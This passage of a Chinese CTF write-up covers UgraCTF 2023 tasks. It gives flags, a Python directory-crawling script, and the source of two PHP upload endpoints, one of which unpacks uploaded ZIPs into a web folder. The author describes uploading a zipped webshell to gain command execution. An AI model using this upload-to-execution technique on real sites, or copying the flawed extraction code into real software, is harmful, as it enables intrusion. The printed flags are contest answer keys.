+<p>Mauris posuere posuere tortor. Etiam dictum at turpis eget iaculis. Quisque tortor ipsum, maximus et pretium ut, vehicula sed ligula. Nulla sed consequat ex, a mollis risus. Duis condimentum at urna vel fringilla. Donec varius, dolor sed interdum efficitur, orci sapien auctor turpis, consequat efficitur felis diam quis turpis. Donec laoreet, ante sed tincidunt euismod, metus tellus feugiat nulla, sed congue elit est a libero. Ut sollicitudin orci ut orci dapibus, sit amet accumsan risus luctus. Phasellus mollis lectus id mauris venenatis consequat ut sollicitudin urna. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse potenti. In feugiat volutpat interdum. Aliquam lobortis tortor est, ac imperdiet felis mollis vel. Duis neque ligula, bibendum nec auctor a, hendrerit eget ante.</p>
+<p>Mauris in commodo diam. Donec tellus ex, ultrices ut erat sed, placerat placerat tellus. Sed leo nunc, imperdiet eget sem a, auctor imperdiet massa. Praesent vitae feugiat tellus, id molestie orci. Vivamus vitae justo metus. Quisque sit amet nisi erat. Duis auctor nisi eu tellus feugiat, vel efficitur sapien aliquet. Maecenas metus nunc, posuere sit amet vestibulum ac, dictum vel arcu. Phasellus eu tellus eu erat blandit tincidunt a eu augue. Ut ac libero pretium, egestas tellus vel, pharetra erat. Aliquam sem nibh, accumsan at consectetur non, lobortis a tortor. Maecenas rhoncus ante quam, ac vestibulum nulla luctus vitae. Cras ac risus id turpis elementum tincidunt a quis orci. Vivamus in est fringilla, varius leo eu, tempus quam. Pellentesque vitae tristique mauris.</p>
+<p>Proin id luctus libero. Nunc fringilla interdum diam. Morbi quam libero, semper quis lacus et, bibendum mattis risus. Aliquam vitae accumsan ipsum. Integer rhoncus diam eget odio egestas volutpat. Nunc est velit, dignissim sed auctor et, venenatis eget nisl. Maecenas dictum porttitor enim. Donec eget ipsum id magna faucibus ullamcorper eget sed massa.</p>
+<p>Etiam congue tincidunt dolor nec vestibulum. Vivamus rhoncus erat sed felis suscipit, sit amet elementum tortor bibendum. Duis accumsan fringilla turpis at aliquet. Aenean leo quam, porta vitae euismod in, malesuada et risus. Mauris ante enim, rhoncus id velit vel, posuere imperdiet leo. Pellentesque iaculis tincidunt tortor, sit amet consequat nisl sollicitudin sit amet. Ut venenatis est mi, vitae pharetra arcu tincidunt non. Morbi et egestas ex. Suspendisse tincidunt magna a lorem vulputate rhoncus.</p>
+<p>Quisque urna felis, imperdiet quis urna a, placerat sodales libero. Curabitur eleifend luctus turpis vitae ultrices. Sed vel dapibus dui, sed tempus leo. Nullam sed turpis enim. Maecenas vel molestie augue. Suspendisse tincidunt lorem nisi, eu tincidunt elit lobortis quis. Quisque eu imperdiet lectus. Mauris porta arcu diam, et rhoncus massa euismod a. Etiam at orci odio. Nullam tincidunt vehicula erat, a bibendum risus gravida id. Fusce facilisis elit lacus, at gravida neque volutpat et. Praesent sollicitudin ut justo vel dictum. Phasellus ante lectus, vestibulum eget molestie vel, lacinia et risus. Etiam non condimentum lorem. Donec dolor dui, faucibus a enim ut, vehicula tristique purus.</p>
+</blockquote>
+<p>得到flag</p>
+<p>ugra_double_security_for_only_50_more_bucks_o2nvw9n27bgj</p>
+<h1 id="forensics">FORENSICS</h1>
+<h2 id="захват-трафика">Захват трафика</h2>
+<blockquote>
+<p>Нам удалось перехватить секретную передачу данных. Есть ли в ней что-то интересное?</p>
+</blockquote>
+<p>流量分析，导出一个图片即flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115133628036.png?x-oss-process=hzy" alt="image-20230115133628036"></p>
+<p>ugra_traffic_extractor_0ae1c61ce023</p>
+<h1 id="stegano">STEGANO</h1>
+<h2 id="музыкальная-пятиминутка">Музыкальная пятиминутка</h2>
+<blockquote>
+<p>В конце рабочего дня — самое то!</p>
+</blockquote>
+<p>一个音频，主要在音频上的图片上</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115172318071.png?x-oss-process=hzy" alt="image-20230115172318071"></p>
+<p>从ugra开始连线到最后拼一块就是flag</p>
+<p>ugra_we_support_local_artists_f6f385</p>
+<h1 id="misc">MISC</h1>
+<h2 id="поле-для-сдачи-флага">Поле для сдачи флага</h2>
+<blockquote>
+<p>А вы прочитали правила олимпиады? Тогда вы уже должны знать хотя бы один флаг.</p>
+<p>Осталось только найти, куда же его сдать.</p>
+</blockquote>
+<p>看规则有flag</p>
+<p>ugra_ex4mpl3</p>
+<h1 id="ppc">PPC</h1>
+<h2 id="глубина">Глубина</h2>
+<blockquote>
+<p>У каждого есть знакомый с под сотней файлов на рабочем столе. Но, оказывается, бывает и хуже…</p>
+</blockquote>
+<p>进去之后是</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115180833066.png?x-oss-process=hzy" alt="image-20230115180833066"></p>
+<p>不难发现就是选有标签的一直循环下去直到结束，选错了的话就是一句话</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115180907549.png?x-oss-process=hzy" alt="image-20230115180907549"></p>
+<p>用我这仅有的python功底写了个脚本来跑</p>
+<pre><code class="hljs plaintext"># -*- coding: utf-8 -*-
+import requests
+from bs4 import BeautifulSoup
+import time
+import re
+
+i=0
+url = &#x27;https://depth.q.2023.ugractf.ru/pn4p0p46xjfno0zv/scheming_viper/wireless_cottonmouth/pearl_welder/killer_filly/orange_panther/ivory_screwdriver/orbiting_weapon/urban_moose/orbiting_harp/jade_warning/warring_python/searching_song/dangerous_nomad/explosive_gazelle/dangerous_leopard/stalking_barnacle/rowdy_chain/warring_motherboard/orbiting_chef/unnecessary_elk/opal_rhythm/bad_mixer/rowdy_cornet/opal_nomad/pearl_network/revealing_network/amber_cleric/explosive_commander/rowdy_trumpet/tundra_captain/orbiting_wrench/amber_camera/revealing_weapon/diamond_cleric/flying_player/rowdy_storm/revealing_rhythm/hunting_camera/orange_wildcat/tarnished_router/unknown_pegasus/bone_fairy/unknown_weapon/agate_horse/destroyed_troll/stalking_wrench/uncanny_mermaid/draconic_lobster/nacre_cheetah/coral_door/agate_general/yellow_nomad/urban_jackal/orange_mermaid/jet_hail/draconic_pony/unnecessary_commander/tarnished_battery/rowdy_general/green_tape/rowdy_mill/orbiting_device/blue_rhythm/ruby_deer/orbiting_welder/draconic_gelding/decisive_wizard/hunting_yeti/space_mermaid/unexpected_lion/hunting_welder/covert_nomad/jet_flute/scheming_tiger/destroyed_sound/amber_mare/glass_cartridge/mountain_tuba/threatening_projector/waning_cornet/destroyed_zebra/unknown_pony/ivory_violin/scheming_grizzly/desert_clarinet/wireless_projector/draconic_horse/orange_rhythm/ruby_stallion/onyx_compressor/warring_fairy/waning_yearling/hidden_pilot/urban_rhythm/diamond_thunder/obsidian_wrench/dangerous_lathe/stalking_nomad/obsidian_memory/warring_camera/decisive_wrench/destroyed_tiger/searching_compressor/nacre_admiral/bad_unicorn/wireless_beat/desert_yeti/orange_gazelle/violet_leopard/pearl_mill/bone_elk/warring_wizard/blue_tuba/diamond_rain/ivory_stag/blue_warning/orbiting_panther/bad_flute/nacre_cottonmouth/chasing_weapon/searching_boa/opal_elk/wild_jackal/unknown_projector/jet_lion/dangerous_transistor/decisive_hammerhead/sapphire_compressor/yellow_mask/hidden_hail/scheming_admiral/space_stag/amber_wizard/jet_chain/onyx_drill/explosive_door/beryl_chain/obsidian_cyborg/orange_hail/onyx_screwdriver/space_chef/wild_tiger/emerald_drought/orange_harp/jet_cyborg/falling_stallion/ivory_hail/unexpected_cottonmouth/desert_sidewinder/green_packet/emerald_barnacle/insane_battery/urban_general/space_case/bone_guitar/bad_major/tarnished_tiger/unnecessary_memory/sapphire_stallion/yellow_lightning/emerald_cello/tundra_elk/unexpected_yeti/desert_lobster/untouchable_device/inconceivable_wizard/coral_moose/decisive_device/red_commander/draconic_guitar/glass_yeti/killer_wildcat/agate_sander/rowdy_cleric/dangerous_chef/desert_welder/chasing_mixer/tarnished_router/jade_projector/falling_drill/rowdy_vacuum/tarnished_hammer/red_elk/pearl_filly/chasing_cobra/violet_mill/unknown_filly/beryl_horn/diamond_dragon/chasing_pegasus/destroyed_rain/amber_viper/ruby_lightning/flying_yearling/beryl_horse/nacre_unicorn/covert_packet/untouchable_screwdriver/orbiting_lathe/orange_piano/nacre_admiral/blue_yearling/covert_clarinet/urban_nomad/blue_drizzle/red_drill/unknown_projector/onyx_snow/chasing_pony/scheming_robot/ruby_weapon/rowdy_router/jet_jackal/scheming_device/spinning_drum/emerald_inspector/jade_hammer/urban_network/unknown_keyboard/obsidian_display/wireless_chain/unnecessary_commander/spinning_wizard/ivory_dragon/falling_beat/green_unicorn/threatening_welder/threatening_cyborg/urban_rhythm/green_moose/falling_lion/beryl_banjo/mountain_gazelle/revealing_drill/ivory_ink/wild_sun/mountain_gazelle/glass_network/dangerous_cottonmouth/amber_mill/emerald_weapon/insane_cottonmouth/jade_wildcat/glass_griffin/deadly_ink/waning_robot/beryl_piranha/wireless_cartridge/agate_gelding/green_orca/green_trombone/violet_foal/hunting_robot/unknown_inspector/desert_welder/destroyed_lathe/opal_trombone/sapphire_stallion/explosive_clarinet/glass_wizard/waning_warning/glass_boa/bone_hammerhead/killer_cleric/agate_beat/scheming_pegasus/destroyed_robot/insane_motherboard/untouchable_lobster/chasing_cornet/hunting_mask/unexpected_motherboard/falling_octopus/spinning_ink/violet_disk/unexpected_falcon/blue_weapon/killer_keyboard/coral_compressor/untouchable_trumpet/ivory_network/ruby_rhythm/blue_cartridge/scheming_sun/unexpected_case/glass_cartridge/chasing_keyboard/scheming_projector/untouchable_welder/sapphire_crab/untouchable_flute/flying_saxophone/searching_hail/pearl_thunder/agate_horse/amber_hammer/stalking_cornet/draconic_stag/untouchable_gelding/searching_router/draconic_chef/unexpected_sun/killer_inspector/green_camera/spinning_falcon/tundra_wildcat/wild_admiral/waning_memory/wireless_inspector/falling_cup/uncanny_banjo/onyx_orca/mountain_moose/deadly_device/jade_tiger/spinning_koala/revealing_packet/nacre_android/onyx_piccolo/nacre_clarinet/killer_cougar/orange_song/unexpected_mask/space_orca/opal_motherboard/bad_projector/insane_mainframe/uncanny_unicorn/unexpected_rhythm/coral_python/untouchable_fairy/unknown_filly/amber_octopus/tarnished_deer/dangerous_mermaid/unknown_piano/pearl_mask/coral_moose/amber_storm/covert_player/jade_grizzly/diamond_troll/deadly_boa/yellow_major/revealing_major/blue_major/spinning_thunder/warring_captain/waning_player/revealing_transistor/explosive_gazelle/jade_motherboard/urban_mask/jet_yeti/orbiting_snow/bone_viper/deadly_mainframe/space_falcon/orange_falcon/space_cobra/threatening_wildcat/wireless_drum/orbiting_dragon/opal_lion/desert_sun/untouchable_trumpet/jet_chain/sapphire_zebra/tundra_mainframe/revealing_organ/beryl_koala/threatening_elk/decisive_piano/nacre_zebra/stalking_saxophone/inconceivable_harp/tundra_captain/yellow_deer/red_projector/uncanny_pilot/rowdy_guitar/tarnished_warning/flying_beat/green_trumpet/pearl_moose/revealing_moose/diamond_horn/nacre_sidewinder/orbiting_griffin/uncanny_hammerhead/covert_hail/blue_foal/emerald_chef/explosive_gazelle/desert_robot/rowdy_lion/urban_piccolo/amber_sloth/chasing_zebra/ivory_yearling/insane_filly/tundra_captain/dangerous_hammer/space_flute/space_mask/flying_crab/spinning_jackal/untouchable_compressor/tarnished_piccolo/killer_motherboard/explosive_pilot/killer_lightning/decisive_robot/chasing_cup/onyx_violin/pearl_snow/diamond_sound/glass_major/decisive_thunder/searching_vacuum/field_gelding/ruby_pony/red_thunder/emerald_griffin/flying_saxophone/mountain_leopard/waning_network/inconceivable_transistor/hidden_camera/desert_crab/desert_cheetah/rowdy_organ/blue_piranha/hunting_song/waning_hail/warring_cottonmouth/destroyed_trombone/beryl_piano/inconceivable_commander/destroyed_robot/unnecessary_piranha/revealing_banjo/tarnished_jackal/hunting_welder/hidden_organ/uncanny_inspector/pearl_major/uncanny_lion/onyx_mixer/deadly_pegasus/violet_drum/red_unicorn/coral_storm/emerald_captain/coral_zebra/revealing_rhythm/chasing_tuba/dangerous_cougar/sapphire_cobra/yellow_wildcat/stalking_welder/obsidian_keyboard/red_robot/field_cup/green_welder/deadly_griffin/hidden_lobster/unexpected_zebra/orange_cheetah/deadly_drizzle/covert_piranha/deadly_rhythm/diamond_zebra/bone_banjo/agate_captain/spinning_yeti/insane_nomad/scheming_warning/hunting_welder/urban_sander/unnecessary_wildcat/waning_warning/ruby_viper/falling_boa/nacre_mask/deadly_lathe/revealing_chain/destroyed_beat/desert_drill/warring_jackal/destroyed_koala/inconceivable_camera/ruby_lathe/hunting_foal/field_deer/agate_major/obsidian_screwdriver/violet_pegasus/untouchable_snow/untouchable_cougar/&#x27;# 获取网页
+
+
+for i in range(101):
+    res = requests.get(url)
+    res=res.text
+    if &quot;Parent Directory&quot; in res:
+        print(&#x27;傻逼玩意&#x27;)
+        res=res.replace(&#x27;..&#x27;,&#x27;sb&#x27;)
+    print(res)
+        # 解析网页
+    soup = BeautifulSoup(res, &#x27;html.parser&#x27;)
+        # 找到所有的a标签
+    links = soup.find_all(&#x27;a&#x27;)
+        # 遍历a标签
+    for link in links:
+        #print(link)
+
+            # 获取a标签的href属性
+        href = link.get(&#x27;href&#x27;)
+            # 拼接域名
+        full_url = url + href
+            # 访问拼接后的url
+        res = requests.get(full_url)
+        print(full_url,res.text)
+        #print(full_url)
+
+        if(&#x27;HREF&#x27; in res.text):
+            break
+            #url=full_url
+
+        else:
+            continue
+    print(full_url)
+    url=full_url
+    print(url)
+    print(&#x27;找到指定路径，前往下一个&#x27;)
+    i+=1
+    time.sleep(1)</code></pre>
+<p>题目描述说大概一百个，但是我貌似得跑了俩小时才跑完，远不止一百个，值得庆幸的是最后也跑出来了</p>
+<p>他的路径我也贴一下吧</p>
+<pre><code class="hljs plaintext">https://depth.q.2023.ugractf.ru/pn4p0p46xjfno0zv/scheming_viper/wireless_cottonmouth/pearl_welder/killer_filly/orange_panther/ivory_screwdriver/orbiting_weapon/urban_moose/orbiting_harp/jade_warning/warring_python/searching_song/dangerous_nomad/explosive_gazelle/dangerous_leopard/stalking_barnacle/rowdy_chain/warring_motherboard/orbiting_chef/unnecessary_elk/opal_rhythm/bad_mixer/rowdy_cornet/opal_nomad/pearl_network/revealing_network/amber_cleric/explosive_commander/rowdy_trumpet/tundra_captain/orbiting_wrench/amber_camera/revealing_weapon/diamond_cleric/flying_player/rowdy_storm/revealing_rhythm/hunting_camera/orange_wildcat/tarnished_router/unknown_pegasus/bone_fairy/unknown_weapon/agate_horse/destroyed_troll/stalking_wrench/uncanny_mermaid/draconic_lobster/nacre_cheetah/coral_door/agate_general/yellow_nomad/urban_jackal/orange_mermaid/jet_hail/draconic_pony/unnecessary_commander/tarnished_battery/rowdy_general/green_tape/rowdy_mill/orbiting_device/blue_rhythm/ruby_deer/orbiting_welder/draconic_gelding/decisive_wizard/hunting_yeti/space_mermaid/unexpected_lion/hunting_welder/covert_nomad/jet_flute/scheming_tiger/destroyed_sound/amber_mare/glass_cartridge/mountain_tuba/threatening_projector/waning_cornet/destroyed_zebra/unknown_pony/ivory_violin/scheming_grizzly/desert_clarinet/wireless_projector/draconic_horse/orange_rhythm/ruby_stallion/onyx_compressor/warring_fairy/waning_yearling/hidden_pilot/urban_rhythm/diamond_thunder/obsidian_wrench/dangerous_lathe/stalking_nomad/obsidian_memory/warring_camera/decisive_wrench/destroyed_tiger/searching_compressor/nacre_admiral/bad_unicorn/wireless_beat/desert_yeti/orange_gazelle/violet_leopard/pearl_mill/bone_elk/warring_wizard/blue_tuba/diamond_rain/ivory_stag/blue_warning/orbiting_panther/bad_flute/nacre_cottonmouth/chasing_weapon/searching_boa/opal_elk/wild_jackal/unknown_projector/jet_lion/dangerous_transistor/decisive_hammerhead/sapphire_compressor/yellow_mask/hidden_hail/scheming_admiral/space_stag/amber_wizard/jet_chain/onyx_drill/explosive_door/beryl_chain/obsidian_cyborg/orange_hail/onyx_screwdriver/space_chef/wild_tiger/emerald_drought/orange_harp/jet_cyborg/falling_stallion/ivory_hail/unexpected_cottonmouth/desert_sidewinder/green_packet/emerald_barnacle/insane_battery/urban_general/space_case/bone_guitar/bad_major/tarnished_tiger/unnecessary_memory/sapphire_stallion/yellow_lightning/emerald_cello/tundra_elk/unexpected_yeti/desert_lobster/untouchable_device/inconceivable_wizard/coral_moose/decisive_device/red_commander/draconic_guitar/glass_yeti/killer_wildcat/agate_sander/rowdy_cleric/dangerous_chef/desert_welder/chasing_mixer/tarnished_router/jade_projector/falling_drill/rowdy_vacuum/tarnished_hammer/red_elk/pearl_filly/chasing_cobra/violet_mill/unknown_filly/beryl_horn/diamond_dragon/chasing_pegasus/destroyed_rain/amber_viper/ruby_lightning/flying_yearling/beryl_horse/nacre_unicorn/covert_packet/untouchable_screwdriver/orbiting_lathe/orange_piano/nacre_admiral/blue_yearling/covert_clarinet/urban_nomad/blue_drizzle/red_drill/unknown_projector/onyx_snow/chasing_pony/scheming_robot/ruby_weapon/rowdy_router/jet_jackal/scheming_device/spinning_drum/emerald_inspector/jade_hammer/urban_network/unknown_keyboard/obsidian_display/wireless_chain/unnecessary_commander/spinning_wizard/ivory_dragon/falling_beat/green_unicorn/threatening_welder/threatening_cyborg/urban_rhythm/green_moose/falling_lion/beryl_banjo/mountain_gazelle/revealing_drill/ivory_ink/wild_sun/mountain_gazelle/glass_network/dangerous_cottonmouth/amber_mill/emerald_weapon/insane_cottonmouth/jade_wildcat/glass_griffin/deadly_ink/waning_robot/beryl_piranha/wireless_cartridge/agate_gelding/green_orca/green_trombone/violet_foal/hunting_robot/unknown_inspector/desert_welder/destroyed_lathe/opal_trombone/sapphire_stallion/explosive_clarinet/glass_wizard/waning_warning/glass_boa/bone_hammerhead/killer_cleric/agate_beat/scheming_pegasus/destroyed_robot/insane_motherboard/untouchable_lobster/chasing_cornet/hunting_mask/unexpected_motherboard/falling_octopus/spinning_ink/violet_disk/unexpected_falcon/blue_weapon/killer_keyboard/coral_compressor/untouchable_trumpet/ivory_network/ruby_rhythm/blue_cartridge/scheming_sun/unexpected_case/glass_cartridge/chasing_keyboard/scheming_projector/untouchable_welder/sapphire_crab/untouchable_flute/flying_saxophone/searching_hail/pearl_thunder/agate_horse/amber_hammer/stalking_cornet/draconic_stag/untouchable_gelding/searching_router/draconic_chef/unexpected_sun/killer_inspector/green_camera/spinning_falcon/tundra_wildcat/wild_admiral/waning_memory/wireless_inspector/falling_cup/uncanny_banjo/onyx_orca/mountain_moose/deadly_device/jade_tiger/spinning_koala/revealing_packet/nacre_android/onyx_piccolo/nacre_clarinet/killer_cougar/orange_song/unexpected_mask/space_orca/opal_motherboard/bad_projector/insane_mainframe/uncanny_unicorn/unexpected_rhythm/coral_python/untouchable_fairy/unknown_filly/amber_octopus/tarnished_deer/dangerous_mermaid/unknown_piano/pearl_mask/coral_moose/amber_storm/covert_player/jade_grizzly/diamond_troll/deadly_boa/yellow_major/revealing_major/blue_major/spinning_thunder/warring_captain/waning_player/revealing_transistor/explosive_gazelle/jade_motherboard/urban_mask/jet_yeti/orbiting_snow/bone_viper/deadly_mainframe/space_falcon/orange_falcon/space_cobra/threatening_wildcat/wireless_drum/orbiting_dragon/opal_lion/desert_sun/untouchable_trumpet/jet_chain/sapphire_zebra/tundra_mainframe/revealing_organ/beryl_koala/threatening_elk/decisive_piano/nacre_zebra/stalking_saxophone/inconceivable_harp/tundra_captain/yellow_deer/red_projector/uncanny_pilot/rowdy_guitar/tarnished_warning/flying_beat/green_trumpet/pearl_moose/revealing_moose/diamond_horn/nacre_sidewinder/orbiting_griffin/uncanny_hammerhead/covert_hail/blue_foal/emerald_chef/explosive_gazelle/desert_robot/rowdy_lion/urban_piccolo/amber_sloth/chasing_zebra/ivory_yearling/insane_filly/tundra_captain/dangerous_hammer/space_flute/space_mask/flying_crab/spinning_jackal/untouchable_compressor/tarnished_piccolo/killer_motherboard/explosive_pilot/killer_lightning/decisive_robot/chasing_cup/onyx_violin/pearl_snow/diamond_sound/glass_major/decisive_thunder/searching_vacuum/field_gelding/ruby_pony/red_thunder/emerald_griffin/flying_saxophone/mountain_leopard/waning_network/inconceivable_transistor/hidden_camera/desert_crab/desert_cheetah/rowdy_organ/blue_piranha/hunting_song/waning_hail/warring_cottonmouth/destroyed_trombone/beryl_piano/inconceivable_commander/destroyed_robot/unnecessary_piranha/revealing_banjo/tarnished_jackal/hunting_welder/hidden_organ/uncanny_inspector/pearl_major/uncanny_lion/onyx_mixer/deadly_pegasus/violet_drum/red_unicorn/coral_storm/emerald_captain/coral_zebra/revealing_rhythm/chasing_tuba/dangerous_cougar/sapphire_cobra/yellow_wildcat/stalking_welder/obsidian_keyboard/red_robot/field_cup/green_welder/deadly_griffin/hidden_lobster/unexpected_zebra/orange_cheetah/deadly_drizzle/covert_piranha/deadly_rhythm/diamond_zebra/bone_banjo/agate_captain/spinning_yeti/insane_nomad/scheming_warning/hunting_welder/urban_sander/unnecessary_wildcat/waning_warning/ruby_viper/falling_boa/nacre_mask/deadly_lathe/revealing_chain/destroyed_beat/desert_drill/warring_jackal/destroyed_koala/inconceivable_camera/ruby_lathe/hunting_foal/field_deer/agate_major/obsidian_screwdriver/violet_pegasus/untouchable_snow/searching_griffin/</code></pre>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115181041720.png?x-oss-process=hzy" alt="image-20230115181041720"></p>
+<p>ugra_i_have_always_imagined_that_paradise_will_be_a_kind_of_library_7v1mlf5vo268</p>
+<h1 id="ctb">CTB</h1>
+<h2 id="доказательство-запугиванием">Доказательство запугиванием</h2>
+<blockquote>
+<p>Если бы олимпиады разрабатывали математики, потерявшие связь с реальностью, то они бы выглядели как-то так. Хотя постойте…</p>
+</blockquote>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192438442.png?x-oss-process=hzy" alt="image-20230115192438442"></p>
+<p>看描述可以知道是可以上传ZIP文件的，先上传一个图片试一下</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192524582.png?x-oss-process=hzy" alt="image-20230115192524582"></p>
+<p>发现报错，打开 ZIP 包装时出现错误代码 19，应该是对上传的文件进行了解压但是因为他是图片解压不了，所以可以大胆试一下，就直接用小马压缩成压缩包直接传过去</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192645166.png?x-oss-process=hzy" alt="image-20230115192645166"></p>
+<p>发现解析了，可以执行命令，得到flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115192702155.png?x-oss-process=hzy" alt="image-20230115192702155"></p>
+<p>ugra_this_aint_funny_this_is_cursed_tmecoyvx5n0u</p>
+<p>最后这放一下这道题目上传功能的主要源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL | E_NOTICE);
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;archive&quot;</span>])) &#123;
+<span class="hljs-variable">$zip_path</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;archive&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];
+<span class="hljs-variable">$dir_path</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>));
+
+<span class="hljs-variable">$za</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();
+<span class="hljs-variable">$res</span> = <span class="hljs-variable">$za</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zip_path</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span> !== <span class="hljs-literal">true</span>) &#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Error code <span class="hljs-subst">$res</span> while extracting ZIP&lt;/p&gt;&quot;</span>;
+&#125; <span class="hljs-keyword">else</span> &#123;
+<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir_path</span>);
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Files uploaded:&lt;/p&gt;&quot;</span>;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;ol&gt;&quot;</span>;
+
+<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$za</span>-&gt;numFiles; <span class="hljs-variable">$i</span>++) &#123;
+<span class="hljs-variable">$stat</span> = <span class="hljs-variable">$za</span>-&gt;<span class="hljs-title function_ invoke__">statIndex</span>(<span class="hljs-variable">$i</span>);
+
+<span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$stat</span>[<span class="hljs-string">&quot;name&quot;</span>];
+<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$stat</span>[<span class="hljs-string">&quot;name&quot;</span>], -<span class="hljs-number">1</span>) === <span class="hljs-string">&quot;/&quot;</span>) &#123;
+<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$file_path</span>);
+&#125; <span class="hljs-keyword">else</span> &#123;
+<span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;zip://<span class="hljs-subst">$zip_path</span>#<span class="hljs-subst">&#123;$stat[&quot;name&quot;]&#125;</span>&quot;</span>, <span class="hljs-variable">$file_path</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li&gt;&lt;a href=&#x27;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$file_path</span>) . <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$stat</span>[<span class="hljs-string">&quot;name&quot;</span>]) . <span class="hljs-string">&quot;&lt;/a&gt;&lt;/li&gt;&quot;</span>;
+&#125;
+&#125;
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/ol&gt;&quot;</span>;
+&#125;
+&#125;</code></pre>
+<h2 id="антивирус-возвращается">Антивирус возвращается</h2>
+<blockquote>
+<p>Современные антивирусы настолько прочно влезают в систему, что их с тем же успехом можно считать вирусами: границы все более и более размыты. А еще дыры в некоторых антивирусах приводят к запуску вирусного кода с правами администратора.</p>
+<p>А вы спокойно спите по ночам?</p>
+</blockquote>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214308473.png?x-oss-process=hzy" alt="image-20230115214308473"></p>
+<p>又是个文件上传，这个会检测可能是否是病毒，同时给了附件，源码分析一下</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_malware</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$file_path</span></span>): <span class="hljs-title">string</span> </span>&#123;
+<span class="hljs-variable">$line</span> = <span class="hljs-keyword">array</span>();
+<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;file &quot;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$file_path</span>), <span class="hljs-variable">$lines</span>);
+<span class="hljs-variable">$log</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-variable">$lines</span>);
+<span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$log</span>, <span class="hljs-string">&quot;executable&quot;</span>) !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$log</span>, <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;ByIvanov&quot;</span>)) === <span class="hljs-literal">false</span>) === (<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>) &lt; <span class="hljs-number">10</span>)) &#123;
+<span class="hljs-variable">$log</span> .= <span class="hljs-string">&quot;\nProbably a virus!&quot;</span>;
+&#125; <span class="hljs-keyword">else</span> &#123;
+<span class="hljs-variable">$log</span> .= <span class="hljs-string">&quot;\nMost likely not a virus.&quot;</span>;
+&#125;
+<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// We must pretend that we are doing something useful</span>
+<span class="hljs-keyword">return</span> <span class="hljs-variable">$log</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Ivanov Anti-Virus&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+Upload the file to check:
+
+&lt;form method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;
+&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;malware&quot;</span>&gt;
+&lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span>&gt;
+&lt;/form&gt;
+
+<span class="hljs-meta">&lt;?php</span>
